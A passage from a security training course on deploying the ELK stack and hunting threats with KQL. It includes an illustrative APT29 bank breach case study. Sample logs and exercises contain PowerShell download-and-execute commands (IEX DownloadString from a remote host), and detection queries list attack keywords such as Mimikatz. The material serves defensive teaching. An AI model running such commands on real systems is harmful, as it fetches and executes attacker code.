keystore.path: certs/transport.p12\n  truststore.path: certs/transport.p12\n```\n\n**Start Elasticsearch:**\n\n```bash\n# Enable and start service\nsudo systemctl enable elasticsearch\nsudo systemctl start elasticsearch\n\n# Check status\nsudo systemctl status elasticsearch\n\n# Test connection (may take 30-60 seconds to start)\ncurl -X GET \"https://localhost:9200\" -u elastic -k\n# Enter password when prompted (stored in /etc/elasticsearch/elasticsearch-keystore)\n```\n\n**Reset elastic password (if needed):**\n\n```bash\nsudo /usr/share/elasticsearch/bin/elasticsearch-reset-password -u elastic\n```\n\n### Step 2: Install Kibana\n\n```bash\n# Install Kibana\nsudo apt install kibana\n\n# Configure Kibana\nsudo nano /etc/kibana/kibana.yml\n```\n\n**Configuration** (`kibana.yml`):\n\n```yaml\nserver.port: 5601\nserver.host: \"0.0.0.0\"  # Listen on all interfaces\nserver.name: \"security-kibana\"\n\nelasticsearch.hosts: [\"https://localhost:9200\"]\nelasticsearch.username: \"kibana_system\"\nelasticsearch.password: \"YOUR_PASSWORD_HERE\"  # Generate below\n\nelasticsearch.ssl.certificateAuthorities: [\"/etc/kibana/ca.crt\"]\n```\n\n**Generate Kibana password:**\n\n```bash\n# Reset kibana_system user password\nsudo /usr/share/elasticsearch/bin/elasticsearch-reset-password -u kibana_system\n\n# Copy CA certificate for Kibana to verify Elasticsearch SSL\nsudo cp /etc/elasticsearch/certs/http_ca.crt /etc/kibana/ca.crt\nsudo chown kibana:kibana /etc/kibana/ca.crt\n```\n\n**Start Kibana:**\n\n```bash\n# Enable and start service\nsudo systemctl enable kibana\nsudo systemctl start kibana\n\n# Check status\nsudo systemctl status kibana\n\n# Check logs if issues\nsudo tail -f /var/log/kibana/kibana.log\n```\n\n**Access Kibana:**\n\nOpen browser: `http://<your-server-ip>:5601`\n\nLogin:\n- Username: `elastic`\n- Password: (elastic user password from earlier)\n\n### Step 3: Install Logstash\n\n```bash\n# Install Logstash\nsudo apt install logstash\n\n# Create pipeline configuration\nsudo nano /etc/logstash/conf.d/security-pipeline.conf\n```\n\n**Pipeline Configuration:**\n\n```ruby\ninput {\n  # Receive data from Beats\n  beats {\n    port => 5044\n  }\n  \n  # Receive syslog data\n  syslog {\n    port => 5140\n  }\n}\n\nfilter {\n  # Parse Windows Event Logs\n  if [agent][type] == \"winlogbeat\" {\n    # Already structured by Winlogbeat, minimal processing needed\n    mutate {\n      add_tag => [ \"windows\", \"security\" ]\n    }\n  }\n  \n  # Parse syslog\n  if [type] == \"syslog\" {\n    grok {\n      match => { \"message\" => \"%{SYSLOGLINE}\" }\n    }\n    date {\n      match => [ \"timestamp\", \"MMM  d HH:mm:ss\", \"MMM dd HH:mm:ss\" ]\n    }\n  }\n  \n  # GeoIP enrichment for all logs with source.ip\n  if [source][ip] {\n    geoip {\n      source => \"[source][ip]\"\n      target => \"[source][geo]\"\n    }\n  }\n}\n\noutput {\n  # Send to Elasticsearch\n  elasticsearch {\n    hosts => [\"https://localhost:9200\"]\n    user => \"elastic\"\n    password => \"YOUR_ELASTIC_PASSWORD\"\n    cacert => \"/etc/logstash/ca.crt\"\n    index => \"%{[@metadata][beat]}-%{+YYYY.MM.dd}\"  # Dynamic index based on Beat type\n  }\n  \n  # Debug output (optional - comment out in production)\n  # stdout { codec => rubydebug }\n}\n```\n\n**Copy CA certificate:**\n\n```bash\nsudo cp /etc/elasticsearch/certs/http_ca.crt /etc/logstash/ca.crt\nsudo chown logstash:logstash /etc/logstash/ca.crt\n```\n\n**Start Logstash:**\n\n```bash\n# Test configuration\nsudo /usr/share/logstash/bin/logstash --config.test_and_exit -f /etc/logstash/conf.d/security-pipeline.conf\n\n# Start service\nsudo systemctl enable logstash\nsudo systemctl start logstash\n\n# Check status\nsudo systemctl status logstash\n\n# Monitor logs\nsudo tail -f /var/log/logstash/logstash-plain.log\n```\n\n### Step 4: Deploy Winlogbeat (Windows Endpoint)\n\n**On Windows system:**\n\n```powershell\n# Download Winlogbeat\nInvoke-WebRequest -Uri \"https://artifacts.elastic.co/downloads/beats/winlogbeat/winlogbeat-8.11.0-windows-x86_64.zip\" -OutFile \"winlogbeat.zip\"\n\n# Extract\nExpand-Archive -Path winlogbeat.zip -DestinationPath \"C:\\Program Files\"\nRename-Item \"C:\\Program Files\\winlogbeat-8.11.0-windows-x86_64\" \"Winlogbeat\"\n\n# Edit configuration\nnotepad \"C:\\Program Files\\Winlogbeat\\winlogbeat.yml\"\n```\n\n**Configuration** (`winlogbeat.yml`):\n\n```yaml\nwinlogbeat.event_logs:\n  - name: Security\n    event_id: 4624, 4625, 4672, 4688, 4720, 4732  # Key security events\n  - name: System\n  - name: Application\n\noutput.logstash:\n  hosts: [\"<your-elk-server-ip>:5044\"]\n\n# Optional: Output directly to Elasticsearch (skip Logstash)\n# output.elasticsearch:\n#   hosts: [\"https://<your-elk-server-ip>:9200\"]\n#   username: \"elastic\"\n#   password: \"your-password\"\n#   ssl.certificate_authorities: [\"C:\\\\Program Files\\\\Winlogbeat\\\\ca.crt\"]\n```\n\n**Install and start service:**\n\n```powershell\n# Install as Windows service\ncd \"C:\\Program Files\\Winlogbeat\"\n.\\install-service-winlogbeat.ps1\n\n# Start service\nStart-Service winlogbeat\n\n# Check status\nGet-Service winlogbeat\n\n# Test configuration\n.\\winlogbeat.exe test config\n.\\winlogbeat.exe test output\n```\n\n### Step 5: Verify Data Flow\n\n**In Kibana:**\n\n1. Navigate to **Management** ‚Üí **Stack Management** ‚Üí **Index Management**\n2. Verify `winlogbeat-*` indices exist\n3. Navigate to **Analytics** ‚Üí **Discover**\n4. Create index pattern: `winlogbeat-*`\n5. Search for data: `event.code: 4624` (successful logins)\n\n**Success Indicators:**\n- Winlogbeat index appears (usually within 60 seconds)\n- Events are searchable in Discover\n- No errors in Logstash logs\n\nCongratulations! You now have a working ELK stack collecting Windows security events!"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "# KQL (Kibana Query Language): Threat Hunting Queries\n\n## KQL Basics\n\nKQL is Kibana's search language for filtering and querying Elasticsearch data. It's simpler than Elasticsearch's Query DSL but powerful for threat hunting.\n\n### Simple Field Queries\n\n```kql\n# Exact match\nevent.code: 4624\n\n# Text search (partial match)\nuser.name: admin*\n\n# Multiple values (OR)\nevent.code: (4624 OR 4625 OR 4672)\n\n# Range query\n@timestamp >= \"2024-10-28T00:00:00\" AND @timestamp < \"2024-10-29T00:00:00\"\n\n# Wildcard\nprocess.name: power*  # Matches powershell.exe, powershell_ise.exe\n```\n\n### Boolean Logic\n\n```kql\n# AND operator\nevent.code: 4624 AND winlog.event_data.LogonType: 10\n\n# OR operator\nevent.code: (4624 OR 4625)\n\n# NOT operator\nNOT source.ip: 192.168.1.0/24\n\n# Nested logic\n(event.code: 4624 AND winlog.event_data.LogonType: 10) OR (event.code: 4625 AND winlog.event_data.FailureReason: *password*)\n```\n\n### Field Existence\n\n```kql\n# Field exists\nprocess.parent.name: *\n\n# Field does not exist\nNOT process.parent.name: *\n```\n\n## Threat Hunting Queries\n\n### Hunt 1: Detect RDP Brute-Force\n\n**Goal**: Find source IPs with 10+ failed RDP logins in 5 minutes\n\n**KQL Query** (in Discover):\n\n```kql\nevent.code: 4625 AND winlog.event_data.LogonType: 10\n```\n\n**Visualization** (Create in Kibana):\n\n1. **Visualization Type**: Data Table\n2. **Metrics**: Count\n3. **Buckets**:\n   - Rows: Terms aggregation on `source.ip`\n   - Columns: Terms aggregation on `@timestamp` (5-minute intervals)\n4. **Filter**: Events in last 24 hours\n\n**Alert Rule** (Kibana Detection Rule):\n\n```yaml\nRule Type: Threshold\nIndex Pattern: winlogbeat-*\nQuery: event.code: 4625 AND winlog.event_data.LogonType: 10\nGroup By: source.ip\nThreshold: >= 10 events in 5 minutes\nActions: Send Slack notification, Create Jira ticket\n```\n\n### Hunt 2: Detect Process Injection (Suspicious Parent-Child Relationships)\n\n**Goal**: Find unusual parent processes spawning cmd.exe or powershell.exe\n\n**KQL Query**:\n\n```kql\nprocess.name: (cmd.exe OR powershell.exe OR wscript.exe) \nAND process.parent.name: (excel.exe OR winword.exe OR outlook.exe OR acrobat.exe)\n```\n\n**Why This Detects Threats:**\n- Office applications shouldn't spawn command shells\n- Common malware delivery method (macro-enabled documents)\n- Detects Emotet, Dridex, TrickBot initial access\n\n**Example Match**:\n\n```json\n{\n  \"@timestamp\": \"2024-10-28T15:32:10Z\",\n  \"process\": {\n    \"name\": \"powershell.exe\",\n    \"command_line\": \"powershell.exe -enc JABjAGwAaQBlAG4AdAA...\",\n    \"parent\": {\n      \"name\": \"outlook.exe\"\n    }\n  },\n  \"user\": {\n    \"name\": \"victim\"\n  }\n}\n```\n\n### Hunt 3: Detect Lateral Movement via PSExec\n\n**Goal**: Find PSExec service installation (Event ID 7045)\n\n**KQL Query**:\n\n```kql\nevent.code: 7045 AND winlog.event_data.ServiceName: PSEXESVC\n```\n\n**Expanded Hunt** (with network logon correlation):\n\n```kql\n# Step 1: Find PSEXESVC installations\nevent.code: 7045 AND winlog.event_data.ServiceName: PSEXESVC\n\n# Step 2: Correlate with network logons (Event ID 4624 LogonType 3) from same source IP within 5 minutes\nevent.code: 4624 AND winlog.event_data.LogonType: 3 AND @timestamp within 5m of PSEXESVC event\n```\n\n### Hunt 4: Detect Kerberoasting\n\n**Goal**: Find TGS requests for service accounts with RC4 encryption (Event ID 4769)\n\n**KQL Query**:\n\n```kql\nevent.code: 4769 \nAND winlog.event_data.TicketEncryptionType: 0x17  # RC4-HMAC (weak)\nAND NOT winlog.event_data.ServiceName: *$  # Exclude machine accounts\n```\n\n**Why This Works:**\n- Attackers request Kerberos tickets for service accounts\n- Service accounts often have weak passwords\n- RC4 tickets can be cracked offline\n\n### Hunt 5: Detect Fileless Malware (PowerShell ScriptBlock Logging)\n\n**Goal**: Find encoded PowerShell commands with suspicious keywords\n\n**KQL Query**:\n\n```kql\nevent.code: 4104  # PowerShell Script Block Logging\nAND powershell.file.script_block_text: (*-enc* OR *DownloadString* OR *IEX* OR *Invoke-Expression* OR *WebClient* OR *Mimikatz*)\n```\n\n**Advanced Version** (regex match):\n\n```kql\nevent.code: 4104\nAND powershell.file.script_block_text: /[A-Za-z0-9+/]{100,}={0,2}/  # Base64 encoded strings\n```\n\n### Hunt 6: Detect Suspicious DNS Queries (DGA Domains)\n\n**Goal**: Find DNS queries to algorithmically generated domains (malware C2)\n\n**KQL Query** (requires Packetbeat DNS monitoring):\n\n```kql\ndns.question.name: /*.{20,}\\.com/  # Long random-looking domains\nAND NOT dns.question.name: (*.google.com OR *.microsoft.com OR *.amazon.com)  # Whitelist legitimate\n```\n\n**Example DGA Domains** (Conficker, Emotet):\n- `akjhdfjkhsd8734kjhsdf.com`\n- `98sdfjh234jkhsdf89.net`\n\n### Hunt 7: Detect Privilege Escalation\n\n**Goal**: Find users added to privileged groups (Event ID 4732)\n\n**KQL Query**:\n\n```kql\nevent.code: 4732 \nAND winlog.event_data.TargetUserName: (\"Domain Admins\" OR \"Enterprise Admins\" OR \"Administrators\")\n```\n\n**Correlation**: Check if the user who added the account (Subject) is authorized\n\n## Advanced KQL Techniques\n\n### Negative Hunting (Baseline Deviations)\n\n**Find processes NOT seen in last 30 days:**\n\n```kql\n# Step 1: Baseline query (last 30 days)\nprocess.name: * AND @timestamp >= now-30d\n\n# Step 2: Save common process names to whitelist\n# (Create in Kibana Dashboard as reference)\n\n# Step 3: Hunt for new processes (last 24 hours)\nprocess.name: * AND @timestamp >= now-24h\nAND NOT process.name: (explorer.exe OR chrome.exe OR ...)\n```\n\n### Time-Based Anomaly Detection\n\n**Find logins outside business hours:**\n\n```kql\nevent.code: 4624\nAND @timestamp: hour < 6 OR hour > 18  # Before 6 AM or after 6 PM\nAND winlog.event_data.LogonType: 10  # Interactive\n```\n\n### Aggregations in Kibana Lens\n\n**Top 10 Source IPs by Failed Logins:**\n\n1. Create Lens visualization\n2. Query: `event.code: 4625`\n3. Visualization: Bar chart\n4. Breakdown: Top 10 values of `source.ip`\n5. Metric: Count\n\n## KQL vs. Lucene Query Syntax\n\nKibana supports both KQL (default) and Lucene syntax.\n\n**Toggle in Discover:** Click the search bar dropdown, select \"Lucene\"\n\n**Lucene Example:**\n\n```lucene\nevent.code:4624 AND winlog.event_data.LogonType:10 AND source.ip:[192.168.1.0 TO 192.168.1.255]\n```\n\n**When to Use Lucene:**\n- Need fuzzy matching: `user.name:admin~` (finds \"admin\", \"adm1n\")\n- Need proximity searches: `\"failed login\"~5` (words within 5 positions)\n- Complex regex: `process.name:/power.*\\.exe/`\n\n**Recommendation**: Start with KQL (easier), switch to Lucene for advanced features."
      }
    },
    {
      "type": "memory_aid",
      "content": {
        "text": "# üß† ELK Stack Memory Aids\n\n## The ELK Flow: **I-F-O** (Input-Filter-Output)\n\nEvery Logstash pipeline follows this pattern:\n\n**I**nput ‚Üí **F**ilter ‚Üí **O**utput\n\n**Mnemonic**: \"**I** **F**ind **O**utliers\" (security analyst's job)\n\n---\n\n## The 4 Beats: **FWPM**\n\n- **F**ilebeat: Files\n- **W**inlogbeat: Windows\n- **P**acketbeat: Packets\n- **M**etricbeat: Metrics\n\n**Mnemonic**: \"**F**ind **W**indows **P**ackets and **M**etrics\"\n\n---\n\n## Elasticsearch Cluster Roles: **MDC**\n\n- **M**aster: Manages cluster\n- **D**ata: Stores data\n- **C**oordinating: Coordinates requests\n\n**Mnemonic**: \"**M**y **D**ata **C**enters\" (what ES manages)\n\n---\n\n## KQL Boolean Logic: **AON**\n\n- **A**ND: Both conditions true\n- **O**R: Either condition true\n- **N**OT: Negate condition\n\n**Example**: `(A AND B) OR NOT C`\n\n---\n\n## Grok Pattern Structure: **%{SYNTAX:SEMANTIC}**\n\n```ruby\n%{IP:source_ip} - - \\[%{HTTPDATE:timestamp}\\] \"%{WORD:method} %{URIPATH:uri}\"\n```\n\n**Remember**: \n- `IP` = syntax (what pattern to match)\n- `source_ip` = semantic (what to name the field)\n\n**Mnemonic**: \"**S**yntax **S**emantic\" (S¬≤ - syntax squared)\n\n---\n\n## Event ID Cheat Sheet (Windows)\n\n**Login Events**: **4624 = Success**, **4625 = Failure**\n**Mnemonic**: \"**24** hours success, **25** hours failure (overtime = fail)\"\n\n**Account Created**: **4720**\n**Mnemonic**: \"**720** degrees = 2 full circles = **2** eyes watching new account\"\n\n**Group Membership Changed**: **4732**\n**Mnemonic**: \"**47** = **4**dmin, **32** = **bits** in IP address (network admin)\"\n\n**Process Created**: **4688**\n**Mnemonic**: \"**4688** = **4** + **688** (process has PID number)\"\n\n**Service Installed**: **7045**\n**Mnemonic**: \"**7045** = **70** services + **45** degrees angle (lateral movement)\"\n\n---\n\n## Index Naming Convention: **TYPE-DATE**\n\n```\nwinlogbeat-2024.10.28\nfilebeat-2024.10.28\nfirewall-logs-2024.10.28\n```\n\n**Pattern**: `{data-source}-{YYYY.MM.DD}`\n\n**Why Date?** Easy to delete old data (just delete old indices)\n\n---\n\n## The Golden Rule of ELK Performance\n\n**\"Feed the Shards, Not the Queries\"**\n\nMeaning:\n- Optimize index settings (shard count, refresh interval)\n- Pre-filter data in Logstash\n- Don't run expensive queries on huge time ranges\n\n**Remember**: Elasticsearch is fast at **finding** needles, slow at **counting** haystacks.\n\n---\n\n## Troubleshooting Flow: **SLK** (Shipper ‚Üí Logstash ‚Üí Kibana)\n\n1. **S**hipper: Check Beat status (`systemctl status winlogbeat`)\n2. **L**ogstash: Check pipeline logs (`/var/log/logstash/logstash-plain.log`)\n3. **K**ibana: Check if indices exist (Management ‚Üí Index Management)\n\n**Mnemonic**: \"**S**tart **L**ooking at **K**ibana last\" (bottom-up debugging)"
      }
    },
    {
      "type": "real_world",
      "content": {
        "text": "# Real-World Case Study: ELK Stack Detects APT Compromise\n\n## The Incident: APT29 (Cozy Bear) at Financial Services Firm\n\n**Company**: Regional Bank (5,000 employees, 800 servers)\n**Threat Actor**: APT29 (Russian state-sponsored)\n**Date**: March 2024\n**Dwell Time**: 47 days before detection\n**Discovery Method**: ELK Stack correlation rule\n\n### Background\n\nAPT29 compromised the bank through a spear-phishing campaign targeting the finance department. They maintained persistence for 47 days, exfiltrating customer data and financial records.\n\n**ELK Stack Deployment:**\n- 3-node Elasticsearch cluster (900GB indexed daily)\n- Logstash processing 50K events/sec\n- 800 Windows endpoints with Winlogbeat\n- 200 Linux servers with Filebeat\n- Firewall logs via Syslog\n\n### Detection Timeline\n\n#### Day 1: Initial Compromise (Missed)\n\n**Attack Vector**: Spear-phishing email with malicious Word document\n\n**What Happened:**\n1. Finance manager opened `Invoice_Q1_2024.docx`\n2. Macro executed PowerShell payload\n3. PowerShell downloaded Cobalt Strike Beacon\n\n**Why ELK Missed It:**\n- No PowerShell ScriptBlock logging enabled at the time\n- Event ID 4688 (Process Creation) logged, but not alerting on Office apps spawning PowerShell\n\n**Logged Event** (discovered retroactively):\n\n```json\n{\n  \"@timestamp\": \"2024-03-01T10:42:15Z\",\n  \"event.code\": 4688,\n  \"process\": {\n    \"name\": \"powershell.exe\",\n    \"command_line\": \"powershell.exe -WindowStyle Hidden -enc JABjAD0ATgBlAHcALQBPAGIA\",\n    \"parent\": {\n      \"name\": \"winword.exe\"\n    }\n  },\n  \"user\": {\n    \"name\": \"finance_manager\"\n  },\n  \"host\": {\n    \"name\": \"FIN-WKS-042\"\n  }\n}\n```\n\n**Lesson**: Detection rules must be proactive, not reactive.\n\n#### Days 2-46: Lateral Movement and Reconnaissance (Logged, Not Alerted)\n\nAPT29 moved laterally using:\n- Stolen credentials (Mimikatz)\n- PSExec for remote execution\n- RDP for interactive sessions\n\n**ELK Captured These Events** (but no alerts configured):\n\n**Event 1: Mimikatz Execution (Day 3)**\n\n```json\n{\n  \"@timestamp\": \"2024-03-03T02:15:30Z\",\n  \"event.code\": 10,  # Process Access (requires Sysmon)\n  \"process\": {\n    \"name\": \"lsass.exe\"\n  },\n  \"source_process\": {\n    \"name\": \"powershell.exe\",\n    \"command_line\": \"powershell.exe -c \\\"IEX (New-Object Net.WebClient).DownloadString('http://192.168.50.100/m.ps1')\\\"\"\n  }\n}\n```\n\n**Event 2: Lateral Movement via PSExec (Day 10)**\n\n```json\n{\n  \"@timestamp\": \"2024-03-10T14:22:10Z\",\n  \"event.code\": 7045,  # Service Installed\n  \"winlog.event_data\": {\n    \"ServiceName\": \"PSEXESVC\",\n    \"ServiceFileName\": \"C:\\\\Windows\\\\PSEXESVC.exe\"\n  },\n  \"host\": {\n    \"name\": \"FILE-SRV-03\"\n  }\n}\n```\n\n**Event 3: Domain Admin Account Created (Day 25)**\n\n```json\n{\n  \"@timestamp\": \"2024-03-25T03:45:00Z\",\n  \"event.code\": 4720,  # User Account Created\n  \"winlog.event_data\": {\n    \"TargetUserName\": \"admin_svc2\",\n    \"SubjectUserName\": \"finance_manager\"\n  },\n  \"host\": {\n    \"name\": \"DC-01\"\n  }\n}\n```\n\n#### Day 47: Detection via ELK Correlation Rule\n\n**Trigger**: SOC analyst created new Kibana detection rule\n\n**Detection Rule** (Kibana Rule JSON):\n\n```json\n{\n  \"name\": \"Suspicious Account Created and Immediately Added to Domain Admins\",\n  \"type\": \"eql\",  # Event Query Language (EQL) for sequence detection\n  \"language\": \"eql\",\n  \"query\": \"sequence by winlog.event_data.TargetUserName with maxspan=10m\\n  [any where event.code == \\\"4720\\\"]  /* User Created */\\n  [any where event.code == \\\"4732\\\" and winlog.event_data.TargetUserName == \\\"Domain Admins\\\"]\",  /* Added to DA group */\n  \"index\": [\"winlogbeat-*\"],\n  \"severity\": \"critical\",\n  \"actions\": [\n    {\n      \"group\": \"default\",\n      \"id\": \"slack-notification\",\n      \"params\": {\n        \"message\": \"CRITICAL: Suspicious account {{winlog.event_data.TargetUserName}} created and added to Domain Admins within 10 minutes!\"\n      }\n    }\n  ]\n}\n```\n\n**What It Does:**\n- Looks for Event ID 4720 (account created) followed by 4732 (added to Domain Admins)\n- Within 10-minute window\n- Same target username\n\n**Alert Fired:**\n\n```json\n{\n  \"@timestamp\": \"2024-04-16T15:30:45Z\",\n  \"alert\": {\n    \"rule_name\": \"Suspicious Account Created and Immediately Added to Domain Admins\",\n    \"severity\": \"critical\",\n    \"matched_events\": [\n      {\n        \"event.code\": 4720,\n        \"winlog.event_data.TargetUserName\": \"backup_admin\",\n        \"@timestamp\": \"2024-04-16T15:22:10Z\",\n        \"host.name\": \"DC-01\"\n      },\n      {\n        \"event.code\": 4732,\n        \"winlog.event_data.TargetUserName\": \"Domain Admins\",\n        \"winlog.event_data.MemberName\": \"backup_admin\",\n        \"@timestamp\": \"2024-04-16T15:25:30Z\",\n        \"host.name\": \"DC-01\"\n      }\n    ]\n  }\n}\n```\n\n**Slack Notification:**\n\n```\n[CRITICAL ALERT] Suspicious Account Activity Detected\n\nAccount: backup_admin\nCreated: 2024-04-16 15:22 UTC\nAdded to Domain Admins: 2024-04-16 15:25 UTC (3 minutes later)\nHost: DC-01\n\nAction Required: Investigate immediately\nPlaybook: https://wiki.company.com/security/privileged-account-creation\n```\n\n### Investigation Using ELK\n\n**SOC Analyst Action 1: Pivot on Username**\n\nKibana Discover Query:\n\n```kql\nuser.name: backup_admin OR winlog.event_data.TargetUserName: backup_admin\n```\n\n**Findings:**\n- Account used to access file shares (Event ID 5140)\n- Copied 2.5GB of data to external SMB share\n\n**SOC Analyst Action 2: Identify Patient Zero**\n\nKibana Discover Query:\n\n```kql\nprocess.parent.name: (winword.exe OR excel.exe OR outlook.exe) \nAND process.name: (powershell.exe OR cmd.exe)\nAND @timestamp >= \"2024-02-15\" AND @timestamp < \"2024-03-05\"\n```\n\n**Result**: Found the initial compromise (finance_manager's workstation on Day 1)\n\n**SOC Analyst Action 3: Map Lateral Movement**\n\nKibana Visualization:\n- **Type**: Network Graph\n- **Query**: `event.code: (4624 OR 7045 OR 5140)`\n- **Nodes**: `source.ip` and `destination.ip`\n- **Edges**: Count of events\n\n**Visualization Output:**\n\n```\nFIN-WKS-042 (Patient Zero)\n  ‚îú‚îÄ> FILE-SRV-03 (Day 10, PSExec)\n  ‚îú‚îÄ> DC-01 (Day 15, RDP)\n  ‚îî‚îÄ> SQL-SRV-09 (Day 30, RDP)\n       ‚îî‚îÄ> BACKUP-SRV-01 (Day 45, SMB)\n```\n\n### Containment and Remediation\n\n**Actions Taken:**\n\n1. **Immediate Isolation**: Block network access for compromised accounts\n2. **Password Reset**: Reset all privileged account passwords\n3. **Malware Removal**: Use Velociraptor to hunt for Cobalt Strike beacons\n4. **Log Analysis**: Export ELK data for forensic analysis\n\n**ELK Query for IOC Hunting:**\n\n```kql\n# Hunt for Cobalt Strike named pipes\nfile.name: (*\\msagent_* OR *\\postex_* OR *\\status_*)\n\n# Hunt for C2 network connections\ndestination.ip: 192.168.50.100  # Known C2 IP from investigation\n```\n\n### Lessons Learned and ELK Improvements\n\n**What Worked:**\n‚úÖ ELK captured all relevant events (47-day forensic timeline available)\n‚úÖ Correlation rule detected suspicious behavior\n‚úÖ Kibana visualizations mapped attack path quickly\n‚úÖ Exported data for legal proceedings\n\n**What Failed:**\n‚ùå No proactive detection rules for initial compromise\n‚ùå PowerShell ScriptBlock logging not enabled\n‚ùå Alert fatigue (too many low-priority alerts, missed critical ones)\n\n**Post-Incident ELK Enhancements:**\n\n1. **Enabled PowerShell Logging** (Event ID 4104)\n   ```yaml\n   # Added to Winlogbeat config\n   winlogbeat.event_logs:\n     - name: Microsoft-Windows-PowerShell/Operational\n       event_id: 4104\n   ```\n\n2. **Deployed 15 New Detection Rules**\n   - Office apps spawning PowerShell\n   - Mimikatz keywords in logs\n   - Lateral movement via PSExec/WMI\n   - Kerberoasting (Event ID 4769)\n   - DCSync (Event ID 4662)\n\n3. **Implemented Threat Intelligence Feeds**\n   - Logstash enrichment with MISP IOCs\n   - Automatic tagging of known malicious IPs\n\n4. **Built Executive Dashboard**\n   - Real-time security posture\n   - Critical alert count\n   - Mean time to detect (MTTD)\n   - Mean time to respond (MTTR)\n\n**Result**: MTTD reduced from 47 days to **< 4 hours** for similar attacks.\n\n### SOC Manager Quote\n\n> \"ELK Stack gave us the visibility to reconstruct 47 days of attacker activity. Without it, we'd be flying blind. The lesson? Having logs is great. Having **searchable, correlated** logs with detection rules is what actually stops breaches.\"\n> \n> ‚Äî SOC Manager, Regional Bank"
      }
    },
    {
      "type": "reflection",
      "content": {
        "text": "# Reflection Questions: Test Your ELK Stack Mastery\n\n## Question 1: Architecture Design\n\nYour company has:\n- 10,000 endpoints (8,000 Windows, 2,000 Linux)\n- 200GB of security logs per day\n- Requirement: 90-day retention\n- Budget: $50K for hardware\n\n**Design your ELK architecture:**\n- How many Elasticsearch nodes?\n- How much storage per node?\n- Where do you place Logstash (centralized vs. distributed)?\n- Which Beats on which systems?\n\n*(Sketch out cluster design with node roles and sizing)*\n\n---\n\n## Question 2: Detection Rule Design\n\nCreate a Kibana detection rule for **DCSync attack**.\n\n**Context**: DCSync uses Event ID 4662 (Directory Service Access) with these properties:\n- `Properties`: Contains `{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}` (DS-Replication-Get-Changes)\n- `Properties`: Contains `{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}` (DS-Replication-Get-Changes-All)\n\n**Your Task:**\n1. Write the KQL query\n2. Define the alert trigger condition\n3. Specify actions (Slack, email, etc.)\n4. Explain why this detects DCSync\n\n---\n\n## Question 3: Logstash Pipeline Troubleshooting\n\nYour Logstash pipeline has this filter:\n\n```ruby\nfilter {\n  grok {\n    match => { \"message\" => \"%{IP:source_ip} - - \\[%{HTTPDATE:timestamp}\\] \\\"%{WORD:method}\" }\n  }\n}\n```\n\n**Problem**: Events are indexed, but `source_ip` field is missing.\n\n**Debug steps:**\n1. How do you test the Grok pattern?\n2. What's likely wrong with this pattern?\n3. How do you fix it?\n\n*(Provide corrected pipeline configuration)*\n\n---\n\n## Question 4: Performance Optimization\n\nYour ELK cluster is experiencing:\n- Slow search queries (10+ seconds)\n- High CPU usage on data nodes\n- Index refresh taking 30+ seconds\n\n**Current Setup:**\n- 3 data nodes (8 CPU, 32GB RAM each)\n- 1TB storage per node (75% full)\n- Index settings: 5 shards, 1 replica, 1s refresh interval\n- Retention: 90 days\n\n**Optimize this cluster. What changes do you make?**\n\n*(List at least 5 optimizations with justifications)*\n\n---\n\n## Question 5: Real-World Hunting Scenario\n\nAt 2 AM, you receive alert:\n\n**\"Unusual PowerShell execution on 50 endpoints in last 15 minutes\"**\n\n**Initial Triage Query (in Kibana):**\n\n```kql\nevent.code: 4104 AND @timestamp >= now-15m\n```\n\n**Results show:**\n- 50 endpoints executed identical PowerShell script\n- Script content: `IEX (New-Object Net.WebClient).DownloadString('http://update-service.com/patch.ps1')`\n- All executions triggered by scheduled task\n\n**Your Investigation Plan:**\n1. What's your next KQL query?\n2. What artifacts do you collect (Velociraptor/ELK)?\n3. How do you determine if this is malicious or legitimate?\n4. What containment actions do you take?\n\n*(Provide step-by-step investigation workflow)*\n\n---\n\n## Bonus Challenge: Build a SOC Dashboard\n\nDesign a Kibana dashboard for your SOC with these panels:\n\n1. **Critical Alerts (Last 24 Hours)**: Count of critical-severity alerts\n2. **Top 10 Source IPs by Failed Logins**: Bar chart\n3. **Geographic Distribution of Logins**: World map\n4. **Timeline of Security Events**: Histogram (Event ID 4624, 4625, 4672, 4720, 4732)\n5. **Lateral Movement Heatmap**: Matrix of source ‚Üí destination connections\n\n**Your Task:**\n- List KQL queries for each panel\n- Specify visualization types\n- Define time ranges and refresh rates\n\n*(Create dashboard specification document)*\n\n---\n\n**Reflection Goal**: These questions test your ability to **apply** ELK knowledge in real SOC scenarios. True mastery means you can design, troubleshoot, and optimize ELK in production."
      }
    },
    {
      "type": "mindset_coach",
      "content": {
        "text": "# üéØ You've Conquered ELK Stack: What's Next?\n\n## Your Journey So Far\n\n**What You've Mastered:**\n\n‚úÖ **Architecture**: You understand Elasticsearch clusters, Logstash pipelines, Kibana UI, and Beats deployment\n\n‚úÖ **Deployment**: You can install and configure a production ELK stack from scratch\n\n‚úÖ **Query Language**: You're fluent in KQL for threat hunting\n\n‚úÖ **Detection Engineering**: You can create correlation rules for APT TTPs\n\n‚úÖ **Visualization**: You know how to build SOC dashboards\n\n‚úÖ **Troubleshooting**: You can optimize performance and debug pipeline issues\n\n**That's not beginner knowledge. That's SOC engineer expertise.**\n\n## The Path to ELK Mastery\n\n**Level 1 (Operator)**: Use pre-built dashboards ‚úÖ *You've passed this*\n\n**Level 2 (Analyst)**: Write KQL queries, create visualizations ‚úÖ *You're here*\n\n**Level 3 (Engineer)**: Design architectures, write Logstash pipelines ‚Üê *Next milestone*\n\n**Level 4 (Architect)**: Scale to petabytes, optimize clusters\n\n**Level 5 (Expert)**: Contribute to Elastic project, speak at conferences\n\n## Your 30-Day ELK Challenge\n\n### Week 1: Lab Environment\n- Deploy ELK stack (3-node cluster)\n- Ingest Windows Event Logs (Winlogbeat)\n- Ingest Linux Syslogs (Filebeat)\n- Create 5 basic visualizations\n\n### Week 2: Detection Rules\n- Implement 10 detection rules:\n  1. RDP brute-force\n  2. Kerberoasting\n  3. DCSync\n  4. Process injection\n  5. Lateral movement (PSExec)\n  6. Privilege escalation\n  7. Suspicious PowerShell\n  8. Failed admin logins\n  9. Account lockouts\n  10. New admin accounts\n\n### Week 3: Advanced Pipelines\n- Write custom Logstash Grok patterns\n- Enrich logs with GeoIP\n- Integrate threat intelligence feeds (MISP)\n- Parse firewall logs\n- Parse web application logs\n\n### Week 4: Production Readiness\n- Implement index lifecycle management (ILM)\n- Configure snapshots and backups\n- Set up alerting (ElastAlert or Kibana Alerting)\n- Build executive dashboard\n- Document runbooks\n\n**Completion Reward**: You'll have a portfolio-worthy ELK deployment and real detection engineering skills.\n\n## Jim Kwik's 